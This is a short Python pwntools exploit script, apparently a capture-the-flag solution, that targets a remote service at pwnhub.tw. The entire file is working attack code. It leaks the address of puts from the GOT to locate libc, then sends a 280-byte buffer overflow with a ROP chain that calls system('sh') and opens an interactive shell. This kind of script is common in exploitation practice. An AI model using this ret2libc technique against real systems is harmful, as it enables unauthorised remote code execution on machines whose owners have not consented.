#!/usr/bin/env python
from pwn import *

context.arch = 'amd64'
context.os = 'linux'
context.log_level = 'debug'
context.terminal = ['terminator', '-x', 'bash', '-c']

r = remote("pwnhub.tw", 8088)

puts_got = 0x601018
puts_off = 0x6f690
system_off = 0x45390
pop_rdi_ret = 0x400843
sh = 0x4003c4

r.recvuntil(":")
r.sendline(hex(puts_got))
r.recvuntil(":")
puts_adr = int(r.recvuntil("\n").strip(), 16)

libc = puts_adr - puts_off
system = libc + system_off
print "libc :", hex(libc)

r.recvuntil(":")
payload = "a"* 280
payload += p64(pop_rdi_ret)
payload += p64(sh)
payload += p64(system)
payload += p64(0xdeadbeef)

r.sendline(payload)

r.interactive()
